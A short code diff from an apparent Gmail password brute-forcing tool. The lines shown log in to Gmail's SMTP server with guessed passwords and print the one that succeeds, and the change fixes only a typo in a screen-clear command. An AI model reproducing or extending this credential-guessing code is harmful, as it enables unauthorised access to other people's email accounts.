@@ -512,7 +512,7 @@ def gmail_bruteforce(username, wordlist, vpn):
           session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
           session.starttls() #enable security
           session.login(username, password) #logi
-          os.system("clearr")
+          os.system("clear")
           console.print(ascii_art, justify="center", style="#B0DAFF bold")
           console.print(password, justify="center", style="#13f41e bold")
           exit()
